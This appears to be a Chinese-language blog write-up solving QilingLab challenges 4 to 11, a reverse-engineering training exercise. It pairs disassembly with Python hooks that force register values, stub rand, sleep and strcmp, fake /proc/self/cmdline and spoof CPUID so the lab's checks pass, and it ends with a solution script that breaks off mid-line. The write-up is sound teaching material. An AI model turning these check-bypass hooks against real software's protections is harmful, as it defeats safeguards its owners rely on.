<h4 id="challenge4-writeup"><a href="#challenge4-writeup" class="headerlink" title="challenge4 writeup"></a>challenge4 writeup</h4><p>使用IDA 无法显示反汇编的代码，但是通过汇编不难看出这是一个循环。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">:0000000000000E1D ; Attributes: bp-based frame</span><br><span class="line">.text:0000000000000E1D</span><br><span class="line">.text:0000000000000E1D                 public challenge4</span><br><span class="line">.text:0000000000000E1D challenge4      proc near               ; CODE XREF: start+18F↓p</span><br><span class="line">.text:0000000000000E1D</span><br><span class="line">.text:0000000000000E1D var_18          = qword ptr -18h</span><br><span class="line">.text:0000000000000E1D var_8           = dword ptr -8</span><br><span class="line">.text:0000000000000E1D var_4           = dword ptr -4</span><br><span class="line">.text:0000000000000E1D</span><br><span class="line">.text:0000000000000E1D ; __unwind &#123;</span><br><span class="line">.text:0000000000000E1D                 push    rbp</span><br><span class="line">.text:0000000000000E1E                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000E21                 mov     [rbp+var_18], rdi</span><br><span class="line">.text:0000000000000E25                 mov     [rbp+var_8], 0</span><br><span class="line">.text:0000000000000E2C                 mov     [rbp+var_4], 0</span><br><span class="line">.text:0000000000000E33                 jmp     short loc_E40</span><br><span class="line">.text:0000000000000E35 ; ---------------------------------------------------------------------------</span><br><span class="line">.text:0000000000000E35</span><br><span class="line">.text:0000000000000E35 loc_E35:                                ; CODE XREF: challenge4+29↓j</span><br><span class="line">.text:0000000000000E35                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:0000000000000E39                 mov     byte ptr [rax], 1</span><br><span class="line">.text:0000000000000E3C                 add     [rbp+var_4], 1</span><br><span class="line">.text:0000000000000E40</span><br><span class="line">.text:0000000000000E40 loc_E40:                                ; CODE XREF: challenge4+16↑j</span><br><span class="line">.text:0000000000000E40                 mov     eax, [rbp+var_8]</span><br><span class="line">.text:0000000000000E43                 cmp     [rbp+var_4], eax   # hook eax 寄存器内的值为 1</span><br><span class="line">.text:0000000000000E46                 jl      short loc_E35</span><br><span class="line">.text:0000000000000E48                 nop</span><br><span class="line">.text:0000000000000E49                 pop     rbp</span><br><span class="line">.text:0000000000000E4A                 retn</span><br><span class="line">.text:0000000000000E4A ; &#125; // starts at E1D</span><br><span class="line">.text:0000000000000E4A challenge4      endp</span><br><span class="line"></span><br><span class="line">void challenge4(char *check) &#123;</span><br><span class="line">    int i;</span><br><span class="line">    i = 0;</span><br><span class="line">    while (i &lt; 0) &#123;</span><br><span class="line">        *check = 1;</span><br><span class="line">        i = i + 1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只需要hook eax寄存器里的值为1 ，这样var4 就会小于1.从而改变程序的运行流程。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">def enter_forbidden_loop_hook(ql:Qiling):</span><br><span class="line">	ql.arch.regs.eax =1</span><br><span class="line"></span><br><span class="line">def challenge4(ql:Qiling):</span><br><span class="line">	print(ql.path)</span><br><span class="line">	# get_lib_base need the real filename which is qilinglab-x86_64</span><br><span class="line">	# 获取真实的文件的路径</span><br><span class="line">	base_addr = ql.mem.get_lib_base(os.path.split(ql.path)[-1])</span><br><span class="line">	print(base_addr)</span><br><span class="line">	# Address we need to patch</span><br><span class="line">	test_forbidden_loop_enter =base_addr+ 0xE43</span><br><span class="line">	# Place hook</span><br><span class="line">	ql.hook_address(enter_forbidden_loop_hook, test_forbidden_loop_enter)</span><br></pre></td></tr></table></figure>

<p>主要收获： 修改某个指令中的寄存器的值。</p>
<blockquote>
<p>hook_address(callback，address)  hook 特定的地址</p>
<p>get_lib_base(filename) 获取文件的基址</p>
</blockquote>
<h4 id="challenge5-writeup"><a href="#challenge5-writeup" class="headerlink" title="challenge5 writeup"></a>challenge5 writeup</h4><p>这个函数要求，所有从rand函数出来的值都要相等。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall challenge5(_BYTE *a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned int v1; // eax</span><br><span class="line">  int i; // [rsp+18h] [rbp-48h]</span><br><span class="line">  int j; // [rsp+1Ch] [rbp-44h]</span><br><span class="line">  int v5[14]; // [rsp+20h] [rbp-40h]</span><br><span class="line">  unsigned __int64 v6; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  v1 = time(0LL);</span><br><span class="line">  srand(v1);</span><br><span class="line">  for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5[i] = 0;</span><br><span class="line">    v5[i + 8] = rand();</span><br><span class="line">  &#125;</span><br><span class="line">  for ( j = 0; j &lt;= 4; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( v5[j] != v5[j + 8] )</span><br><span class="line">    &#123;</span><br><span class="line">      *a1 = 0;</span><br><span class="line">      return __readfsqword(0x28u) ^ v6;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *a1 = 1;</span><br><span class="line">  return __readfsqword(0x28u) ^ v6;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>只要每次让rand() 每次返回0 就可以。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">def hook_rand(ql:Qiling):</span><br><span class="line">	ql.arch.regs.rax = 0</span><br><span class="line"></span><br><span class="line">def challenge5(ql:Qiling):</span><br><span class="line">	ql.os.set_api(&#x27;rand&#x27;,hook_rand)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>主要收获：</p>
<blockquote>
<p>rax 寄存器主要作为函数返回值使用。因此直接hook rand 函数返回值传入的寄存器rax 即可。</p>
<p>os.set_api()  主要用于windows API 函数的hook</p>
</blockquote>
<h4 id="challenge6-writeup"><a href="#challenge6-writeup" class="headerlink" title="challenge6 writeup"></a>challenge6 writeup</h4><p>死循环</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">void challenge6(void)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  do &#123;</span><br><span class="line">  &#125; while( true );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.text:0000000000000F12                 movzx   eax, [rbp+var_5]</span><br><span class="line">.text:0000000000000F16                 test    al, al  # 修改rax 寄存器的值</span><br><span class="line">.text:0000000000000F18                 jnz     short loc_F0B</span><br><span class="line">.text:0000000000000F1A                 mov     rax, [rbp+var_18]</span><br><span class="line">.text:0000000000000F1E                 mov     byte ptr [rax], 1</span><br></pre></td></tr></table></figure>

<p>只要修改死循环的部门</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">def hook_while_true(ql:Qiling):</span><br><span class="line">	</span><br><span class="line">	ql.arch.regs.rax = 0</span><br><span class="line"></span><br><span class="line">def challenge6(ql:Qiling):</span><br><span class="line">	base = ql.mem.get_lib_base(&quot;qilinglab-x86_64&quot;)</span><br><span class="line">	ql.hook_address(hook_while_true,base + 0xF16)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="challenge7-writeup"><a href="#challenge7-writeup" class="headerlink" title="challenge7 writeup"></a>challenge7 writeup</h4><p>这是一个sleep 的函数，challenge7 函数会返回sleep 函数，一直sleep。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000000F24 challenge7      proc near               ; CODE XREF: start+1FB↓p</span><br><span class="line">.text:0000000000000F24</span><br><span class="line">.text:0000000000000F24 var_8           = qword ptr -8</span><br><span class="line">.text:0000000000000F24</span><br><span class="line">.text:0000000000000F24 ; __unwind &#123;</span><br><span class="line">.text:0000000000000F24                 push    rbp</span><br><span class="line">.text:0000000000000F25                 mov     rbp, rsp</span><br><span class="line">.text:0000000000000F28                 sub     rsp, 10h</span><br><span class="line">.text:0000000000000F2C                 mov     [rbp+var_8], rdi</span><br><span class="line">.text:0000000000000F30                 mov     rax, [rbp+var_8]</span><br><span class="line">.text:0000000000000F34                 mov     byte ptr [rax], 1</span><br><span class="line">.text:0000000000000F37                 mov     edi, 0FFFFFFFFh ; seconds</span><br><span class="line">.text:0000000000000F3C                 call    _sleep # hook 这个地址</span><br><span class="line">.text:0000000000000F41                 nop</span><br><span class="line">.text:0000000000000F42                 leave</span><br><span class="line">.text:0000000000000F43                 retn</span><br><span class="line">.text:0000000000000F43 ; &#125; // starts at F24</span><br><span class="line">.text:0000000000000F43 challenge7      endp</span><br><span class="line"></span><br><span class="line">unsigned int __fastcall challenge7(_BYTE *a1)</span><br><span class="line">&#123;</span><br><span class="line">  *a1 = 1;</span><br><span class="line">  return sleep(0xFFFFFFFF);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>hook 的办法，可以修改sleep 的参数。</p>
<p>网上有三种办法： 1.直接使用qiling 的api 来hook sleep 函数，直接返回。</p>
<ol start="2">
<li>直接hook 这个参数</li>
<li>直接hook sleep 的系统调用函数nanosleep （这个用的应该不多）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">def modify_arg(ql:Qiling):</span><br><span class="line">	ql.arch.regs.edi=0	</span><br><span class="line">def hook_sleep(ql:Qiling):</span><br><span class="line">	return </span><br><span class="line">def challenge7(ql:Qiling):</span><br><span class="line">	base_addr = ql.mem.get_lib_base(os.path.split(ql.path)[-1])</span><br><span class="line">	# method1 直接hook sleep 传入的参数 的寄存器edi</span><br><span class="line">	#ql.os.set_api(&#x27;sleep&#x27;,modify_arg,QL_INTERCEPT.ENTER)</span><br><span class="line">	ql.hook_address(modify_arg,base_addr+0xF3C)</span><br><span class="line">	# method2 直接hook sleep 函数，让它返回0</span><br><span class="line">	#ql.os.set_api(&#x27;sleep&#x27;,hook_sleep)</span><br></pre></td></tr></table></figure>



<h4 id="challenge8-writeup"><a href="#challenge8-writeup" class="headerlink" title="challenge8 writeup"></a>challenge8 writeup</h4><h4 id="challenge9-writeup"><a href="#challenge9-writeup" class="headerlink" title="challenge9 writeup"></a>challenge9 writeup</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall challenge9(bool *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char *i; // [rsp+18h] [rbp-58h]</span><br><span class="line">  char dest[32]; // [rsp+20h] [rbp-50h] BYREF</span><br><span class="line">  char src[40]; // [rsp+40h] [rbp-30h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+68h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  strcpy(src, &quot;aBcdeFghiJKlMnopqRstuVWxYz&quot;);</span><br><span class="line">  strcpy(dest, src);</span><br><span class="line">  for ( i = dest; *i; ++i )</span><br><span class="line">    *i = tolower(*i);</span><br><span class="line">  *a1 = strcmp(src, dest) == 0;</span><br><span class="line">  return __readfsqword(0x28u) ^ v5;</span><br></pre></td></tr></table></figure>

<p>只需要最终的src和dest 一致就够了，但是tolower 会改变dest的大小写。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">def hook_tolower(ql:Qiling):</span><br><span class="line">	return</span><br><span class="line"></span><br><span class="line">def hook_strcmp(ql:Qiling):</span><br><span class="line">	ql.arch.regs.rax=0</span><br><span class="line">	#return 0</span><br><span class="line"></span><br><span class="line">def challenge9(ql:Qiling):</span><br><span class="line">	ql.os.set_api(&#x27;strcmp&#x27;,hook_strcmp)</span><br><span class="line">	#ql.os.set_api(&#x27;tolower&#x27;,hook_tolower)</span><br></pre></td></tr></table></figure>

<p>因此只需要hook 其中的strcmp（） 和tolower 函数。</p>
<h4 id="challenge10-writeup-hook-FS"><a href="#challenge10-writeup-hook-FS" class="headerlink" title="challenge10 writeup hook FS"></a>challenge10 writeup hook FS</h4><p>hook 文件系统</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall challenge10(_BYTE *a1)</span><br><span class="line">&#123;</span><br><span class="line">  int i; // [rsp+10h] [rbp-60h]</span><br><span class="line">  int fd; // [rsp+14h] [rbp-5Ch]</span><br><span class="line">  ssize_t v4; // [rsp+18h] [rbp-58h]</span><br><span class="line">  char buf[72]; // [rsp+20h] [rbp-50h] BYREF</span><br><span class="line">  unsigned __int64 v6; // [rsp+68h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(0x28u);</span><br><span class="line">  fd = open(&quot;/proc/self/cmdline&quot;, 0);</span><br><span class="line">  if ( fd != -1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = read(fd, buf, 0x3FuLL);</span><br><span class="line">    if ( v4 &gt; 0 )</span><br><span class="line">    &#123;</span><br><span class="line">      close(fd);</span><br><span class="line">      for ( i = 0; v4 &gt; i; ++i )</span><br><span class="line">      &#123;</span><br><span class="line">        if ( !buf[i] )</span><br><span class="line">          buf[i] = 32;</span><br><span class="line">      &#125;</span><br><span class="line">      buf[v4] = 0;</span><br><span class="line">      if ( !strcmp(buf, &quot;qilinglab&quot;) )</span><br><span class="line">        *a1 = 1;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v6;</span><br></pre></td></tr></table></figure>

<p>这里的hook思路是hook 文件系统&#x2F;proc&#x2F;self&#x2F;cmdline ,使读取的值是qilinglab</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">class hook_cmdline(QlFsMappedObject):</span><br><span class="line">	def read(self,size):</span><br><span class="line">		return b&quot;qilinglab&quot;</span><br><span class="line">	def close(self):</span><br><span class="line">		return 0</span><br><span class="line">	</span><br><span class="line">def challenge10(ql:Qiling):</span><br><span class="line">	ql.add_fs_mapper(&quot;/proc/self/cmdline&quot;,hook_cmdline())</span><br><span class="line">	</span><br></pre></td></tr></table></figure>

<p>还有另一种方法</p>
<p>可以直接替换指定文件成我们的文件，先创建我们需要的文件：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo -n &quot;qilinglab&quot;&gt; fake_cmdline</span><br></pre></td></tr></table></figure>

<p>然后代码就可以这样写了：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">def challenge10(ql：Qiling):</span><br><span class="line">	ql.add_fs_mapper(&quot;/proc/self/cmdline&quot;, &quot;./fake_cmdline&quot;)</span><br></pre></td></tr></table></figure>

<p>还一种方法，代码也不用写了，直接往qiling的rootfs里面写：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p ./qiling/examples/rootfs/x8664_linux/proc/self</span><br><span class="line">echo -n &quot;qilinglab&quot; &gt; ./qiling/examples/rootfs/x8664_linux/proc/self/cmdline</span><br></pre></td></tr></table></figure>



<p>challenge11 writeup hook 指令</p>
<p>使用的是hook_code()对单挑指令进行hook，不同于hook库函数和系统调用，这里使用hook_code对单条指令进行hook，hook指令的时候可以限制hook的范围，加速hook的效率，具体的方法是通过map的读写权限和map的文件名限制hook的范围</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">def hook_cpuid(ql,address,size):</span><br><span class="line">    opcode = ql.mem.read(address,size)</span><br><span class="line">    if opcode == b&quot;\x0F\xA2&quot;:</span><br><span class="line">        # bypass check and jump to next instruction</span><br><span class="line">        ql.reg.ebx = 0x696C6951</span><br><span class="line">        ql.reg.ecx = 0x614C676E</span><br><span class="line">        ql.reg.edx = 0x20202062</span><br><span class="line">        ql.reg.rip += 2</span><br><span class="line"># search code segment hook every cpuid</span><br><span class="line">begin, end = 0, 0</span><br><span class="line">for info in ql.mem.map_info:</span><br><span class="line">    if ql.path in info[3] and info[2] == 5:</span><br><span class="line">        begin,end = info[:2]</span><br><span class="line">ql.hook_code(hook_cpuid,begin=begin,end=end)</span><br></pre></td></tr></table></figure>

<p>完整代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br></pre></td><td class="code"><pre><span class="line">#-*- coding:utf-8 -*-</span><br><span class="line">#!/usr/bin/env python3</span><br><span class="line"># </span><br><span class="line"># Cross Platform and Multi Architecture Advanced Binary Emulation Framework</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">sys.path.append(&quot;..&quot;)</span><br><span class="line"></span><br><span class="line">from qiling import *</span><br><span class="line">#from qiling.const import QL_VERBOSE</span><br><span class="line">from qiling.const import *</span><br><span class="line">from qiling.os.mapper import QlFsMappedObject</span><br><span class="line">import os</span><br><span class="line"></span><br><span class="line"># </span><br><span class="line">def challenge1(ql:Qiling):</span><br><span class="line">	print(&quot;1111111&quot;+str(ql.mem.is_mapped(0x1000,0x1000)))</span><br><span class="line">	ql.mem.map(0x1000,0x1000,info=&#x27;[challenge1]&#x27;)</span><br><span class="line">	ql.mem.write(0x1337,ql.pack16(1337)) # pack16(value) == struct.pack(&#x27;H&#x27;,value)</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">def hook_uname_on_exit(ql: Qiling, *args):</span><br><span class="line">	&#x27;&#x27;&#x27;</span><br><span class="line">	.text:0000000000000BD8                 lea     rax, [rbp+name]</span><br><span class="line">	.text:0000000000000BDF                 mov     rdi, rax        ; name</span><br><span class="line">	.text:0000000000000BE2                 call    _uname</span><br><span class="line">	.text:0000000000000BE7                 test    eax, eax</span><br><span class="line">	&#x27;&#x27;&#x27;</span><br><span class="line">	rdi = ql.arch.regs.rdi</span><br><span class="line">	ql.mem.write(rdi, b&#x27;QilingOS\x00&#x27;)</span><br><span class="line">	ql.mem.write(rdi + 65 * 3, b&#x27;ChallengeStart\x00&#x27;)</span><br><span class="line"> 	</span><br><span class="line">def challenge2(ql:Qiling):</span><br><span class="line">	ql.os.set_syscall(&#x27;uname&#x27;, hook_uname_on_exit, QL_INTERCEPT.EXIT)</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">class Fake_urandom(QlFsMappedObject):</span><br><span class="line">	# Fake read fs operation</span><br><span class="line">	def read(self, size):</span><br><span class="line">		if size == 1:</span><br><span class="line">			return b&quot;\x41&quot;</span><br><span class="line">		return b&quot;\x00&quot;*size</span><br><span class="line">	# Fake close fs operation</span><br><span class="line">	def close(self):</span><br><span class="line">		return 0</span><br><span class="line"></span><br><span class="line">def getrandom_hook(ql:Qiling, buf, buflen, flags, *args):</span><br><span class="line">	ql.mem.write(buf,b&quot;\x00&quot;*buflen)</span><br><span class="line">	ql.os.set_syscall_return(0)	</span><br><span class="line"></span><br><span class="line">def challenge3(ql:Qiling):</span><br><span class="line">	ql.os.set_syscall(&quot;getrandom&quot;, getrandom_hook)</span><br><span class="line">	ql.add_fs_mapper(&quot;/dev/urandom&quot;,Fake_urandom())</span><br><span class="line"></span><br><span class="line">def enter_forbidden_loop_hook(ql:Qiling):</span><br><span class="line">	ql.arch.regs.eax =1</span><br><span class="line"></span><br><span class="line">def challenge4(ql:Qiling):</span><br><span class="line">	print(&quot;[++++]&quot;+os.path.split(ql.path)[-1])</span><br><span class="line">	# get_lib_base need the real filename which is qilinglab-x86_64</span><br><span class="line">	base_addr = ql.mem.get_lib_base(os.path.split(ql.path)[-1])</span><br><span class="line">	print(base_addr)</span><br><span class="line">	# Address we need to patch</span><br><span class="line">	test_forbidden_loop_enter =base_addr+ 0xE43</span><br><span class="line">	# Place hook</span><br><span class="line">	ql.hook_address(enter_forbidden_loop_hook, test_forbidden_loop_enter)</span><br><span class="line"></span><br><span class="line">def hook_rand(ql:Qiling):</span><br><span class="line">	ql.arch.regs.rax = 0</span><br><span class="line"></span><br><span class="line">def challenge5(ql:Qiling):</span><br><span class="line">	ql.os.set_api(&#x27;rand&#x27;,hook_rand)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def hook_while_true(ql:Qiling):</span><br><span class="line">	</span><br><span class="line">	ql.arch.regs.rax = 0</span><br><span class="line"></span><br><span class="line">def challenge6(ql:Qiling):</span><br><span class="line">	base = ql.mem.get_lib_base(&quot;qilinglab-x86_64&quot;)</span><br><span class="line">	ql.hook_address(hook_while_true,base + 0xF16)</span><br><span class="line"></span><br><span class="line">def modify_arg(ql:Qiling):</span><br><span class="line">	base_addr = ql.mem.get_lib_base(os.path.split(ql.path)[-1])</span><br><span class="line">	ql.arch.regs.edi=0</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">def hook_sleep(ql:Qiling):</span><br><span class="line">	return </span><br><span class="line"></span><br><span class="line">def challenge7(ql:Qiling):</span><br><span class="line">	# 这个是获取文件的名字</span><br><span class="line">	base_addr = ql.mem.get_lib_base(os.path.split(ql.path)[-1])</span><br><span class="line">	# method1</span><br><span class="line">	#ql.os.set_api(&#x27;sleep&#x27;,modify_arg,QL_INTERCEPT.ENTER)</span><br><span class="line">	ql.hook_address(modify_arg,base_addr+0xF3C)</span><br><span class="line">	# method2</span><br><span class="line">	#ql.os.set_api(&#x27;sleep&#x27;,hook_sleep)</span><br><span class="line">	</span><br><span class="line">def hook_tolower(ql:Qiling):</span><br><span class="line">	return</span><br><span class="line"></span><br><span class="line">def hook_strcmp(ql:Qiling):</span><br><span class="line">	ql.arch.regs.rax=0</span><br><span class="line">	#return 0</span><br><span class="line"></span><br><span class="line">def challenge9(ql:Qiling):</span><br><span class="line">	ql.os.set_api(&#x27;strcmp&#x27;,hook_strcmp)</span><br><span class="line">	#ql.os.set_api(&#x27;tolower&#x27;,hook_tolower)</span><br><span class="line"></span><br><span class="line">class 